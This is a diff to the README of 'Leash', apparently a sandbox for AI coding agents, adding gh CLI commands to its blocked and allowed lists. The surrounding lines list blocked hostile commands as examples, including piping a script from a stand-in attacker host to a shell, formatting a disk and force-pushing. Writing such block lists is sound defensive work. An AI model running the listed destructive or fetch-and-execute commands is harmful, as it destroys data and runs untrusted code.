@@ -11,6 +11,7 @@ AI agents can hallucinate dangerous commands. Leash sandboxes them:
 - Blocks `rm`, `mv`, `cp`, `chmod` outside working directory
 - Protects sensitive files (`.env`, `.git`) even inside project
 - Blocks `git reset --hard`, `push --force`, `clean -f`
+- Blocks dangerous `gh` CLI commands (`auth`, `repo delete`, `pr merge`, `secret`, etc.)
 - Blocks `mkfs`, fork bombs, `curl | sh`, `crontab -r`, `chmod 777`, `docker volume rm/prune`
 - Resolves symlinks to prevent directory escapes
 - Analyzes command chains (`&&`, `||`, `;`, `|`)
@@ -166,6 +167,13 @@ git reset --hard                  # ❌ Destroys uncommitted changes
 git push --force                  # ❌ Destroys remote history
 git clean -fd                     # ❌ Removes untracked files
 
+# Dangerous gh CLI commands (blocked everywhere)
+gh auth login                    # ❌ Auth manipulation
+gh repo delete owner/repo        # ❌ Repo destruction
+gh pr merge 123                  # ❌ Merging PRs
+gh secret set MY_SECRET          # ❌ Secret management
+gh ssh-key add key.pub           # ❌ SSH key management
+
 # System-level dangerous commands (blocked everywhere)
 mkfs.ext4 /dev/sda1              # ❌ Filesystem formatting
 curl http://evil.com/x.sh | sh   # ❌ Pipe to shell
@@ -191,6 +199,9 @@ rm -rf /tmp/build-cache           # ✅ Temp directory
 rm .env.example                   # ✅ Example files allowed
 git commit -m "message"           # ✅ Safe git commands
 git push origin main              # ✅ Normal push (no --force)
+gh pr list                        # ✅ Read-only gh commands
+gh search issues 'bug'            # ✅ Search is safe
+gh api graphql -f query='...'     # ✅ GraphQL queries allowed
 echo "plan" > ~/.claude/plans/x   # ✅ Platform config directories
 rm ~/.pi/agent/old.md             # ✅ Platform config directories
 ```
@@ -228,6 +239,36 @@ git branch -D feature        # ❌ Force-deletes branch without merge check
 git stash drop               # ❌ Permanently deletes stashed changes
 git stash clear              # ❌ Deletes ALL stashed changes
 ```
+
+### Dangerous gh CLI Commands
+
+```bash
+gh auth login                    # ❌ Auth manipulation
+gh codespace create              # ❌ Codespace management
+gh issue delete 42               # ❌ Issue deletion
+gh pr close 123                  # ❌ Closing PRs
+gh pr lock 123                   # ❌ Locking PRs
+gh pr unlock 123                 # ❌ Unlocking PRs
+gh pr merge 123                  # ❌ Merging PRs
+gh project list                  # ❌ Project management
+gh release delete v1.0.0         # ❌ Release deletion
+gh repo create my-repo           # ❌ Repo creation
+gh repo delete owner/repo        # ❌ Repo deletion
+gh repo deploy-key add key.pub   # ❌ Deploy key management
+gh repo fork owner/repo          # ❌ Repo forking
+gh run delete 12345              # ❌ Run deletion
+gh workflow disable ci.yml       # ❌ Workflow management
+gh agent-task create             # ❌ Agent task management
+gh api repos/owner/repo          # ❌ Raw API calls (non-graphql)
+gh attestation verify artifact   # ❌ Attestation management
+gh copilot suggest               # ❌ Copilot access
+gh gpg-keys add key.gpg          # ❌ GPG key management
+gh label delete bug              # ❌ Label deletion
+gh secret set MY_SECRET          # ❌ Secret management
+gh ssh-key add key.pub           # ❌ SSH key management
+```
+
+Note: Read-only commands like `gh pr list`, `gh issue view`, `gh search`, `gh run view`, and `gh api graphql` are allowed.
 
 ### System-Level Dangerous Commands
 
@@ -339,6 +380,18 @@ truncate -s 0 /dev/null
 # Read from anywhere (safe)
 cp /etc/hosts ./local-hosts
 cat /etc/passwd
+
+# Safe gh CLI commands
+gh pr list
+gh pr view 123
+gh pr create --title "fix" --body "desc"
+gh issue list
+gh issue view 42
+gh search issues 'bug'
+gh run list
+gh run view 12345
+gh repo view owner/repo
+gh api graphql -f query='{ viewer { login } }'
 
 # Safe git commands
 git status
